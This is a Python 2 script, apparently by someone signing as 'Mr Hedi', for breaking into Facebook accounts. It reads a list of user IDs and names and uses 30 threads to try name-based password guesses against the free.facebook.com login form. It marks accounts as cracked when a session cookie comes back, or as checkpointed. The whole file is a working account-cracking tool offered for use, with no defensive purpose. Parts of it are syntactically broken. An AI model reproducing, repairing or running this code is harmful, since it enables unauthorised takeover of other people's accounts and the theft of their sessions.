#coding=utf-8
#!/usr/bin/python2
#coding=utf-8
import os

import os, sys, time, datetime, re, bs4, threading, json, getpass, urllib, random, requests, subprocess, platform, hashlib, zlib, cookielib, uuid, json
from multiprocessing.pool import ThreadPool
from concurrent.futures import ThreadPoolExecutor as FUCKBadshah
from datetime import datetime
from bs4 import BeautifulSoup
from requests.exceptions import ConnectionError

logo = "logo = """
\033[1;32;40mdb   db d88888b d8888b. d888888b 
\033[1;37;40m88   88 88'     88  `8D   `88'   
\033[1;32;40m88ooo88 88ooooo 88   88    88    
\033[1;37;40m88~~~88 88~~~~~ 88   88    88    
\033[1;32;40m88   88 88.     88  .8D   .88.   
\033[1;37;40mYP   YP Y88888P Y8888D' Y888888P  

     \033[41m\033[1;37m Codded by  \033[41m\033[1;37mMr Hedi\x1b[0m
      """"
def fuck():
    id = []
    oks = []
    cps = []
    os.system('clear')
    print (logo)
    print("")
    try:
        idlist = raw_input(' \x1b[1;96m File Name: \x1b[0;97m ')
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())
    except IOError:
        print ('[!] File Not Found.')
        raw_input('\x1b[1;36mPress Enter To Back. \x1b[1;97m')
        os.system("exit")
    except KeyboardInterrupt:
        sys.exit(0)
    print (' \x1b[1;36mTotal ids: \x1b[1;36m ' + str(len(id)))
    print (47 * '-')
    def main(arg):
        global ua
        user = arg
        ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
        uid = user.split('|')[0]
        name = user.split('|')
        xz = name[1].split(' ')
        host='https://free.facebook.com'
        try:
            pass1 = xz[0].lower() +' '+xz[1].lower()
            data1 = {}
            ses = requests.Session()
            ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            ged = ses.get(host+"/login/?next&ref=dbl&refid=8").text
            b = BeautifulSoup(ged,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b("input"):
                try:
                    if i.get("name") in bl:data1.update({i.get("name"):i.get("value")})
                except:pass
            data1.update({"email": uid,"pass": pass1,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            final= ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Ffree.facebook.com%2F&lwv=100&refid=8",data=data1)
            if "c_user" in ses.cookies.get_dict().keys():
                cookie = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\x1b[1;36m[HEDI-OK] \x1b[1;36m' + uid + ' | ' + pass1 + '\x1b[0;97m')
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print ('\x1b[1;31m[HEDI-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m')
            else:
                pass2 = xz[0] +' '+ xz[1]
                data2 = {}
                ses = requests.Session()
                ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
                ged = ses.get(host+"/login/?next&ref=dbl&refid=8").text
                b = BeautifulSoup(ged,"html.parser")
                bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
                for i in b("input"):
                    try:
                        if i.get("name") in bl:data2.update({i.get("name"):i.get("value")})
                    except:pass
                data2.update({"email": uid,"pass": pass2,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
                final= ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Ffree.facebook.com%2F&lwv=100&refid=8",data=data2)
                if 'c_user' in ses.cookies.get_dict().keys():
                    cookie = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    print ('\x1b[1;36m[HEDI-OK] \x1b[1;36m' + uid + ' | ' + pass2 + '\x1b[0;97m')
                elif "checkpoint" in ses.cookies.get_dict().keys():
                    print ('\x1b[1;31m[HEDI-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m')
                else:
                    pass3 = xz[0].lower()+'786'
                    data3 = {}
                    ses = requests.Session()
                    ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
                    ged = ses.get(host+"/login/?next&ref=dbl&refid=8").text
                    b = BeautifulSoup(ged,"html.parser")
                    bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
                    for i in b("input"):
                        try:
                            if i.get("name") in bl:data3.update({i.get("name"):i.get("value")})
                        except:pass
                    data3.update({"email": uid,"pass": pass3,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
                    final= ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Ffree.facebook.com%2F&lwv=100&refid=8",data=data3)
                    if 'c_user' in ses.cookies.get_dict().keys():
                        cookie = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                        print ('\x1b[1;36m[HEDI-OK] \x1b[1;36m' + uid + ' | ' + pass3 + '\x1b[0;97m')
                    elif "checkpoint" in ses.cookies.get_dict().keys():
                        print ('\x1b[1;31m[HEDI-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m')
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print (47 * '-')
    print (' \x1b[1;36mCrack Done')
    print (' \x1b[1;36mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps)))
    print (47 * '\033[1;97m-')
    raw_input(' \x1b[1;93mPress enter to back\x1b[0;97m')
    os.system("exit")

if __name__ == '__main__':
	fuck()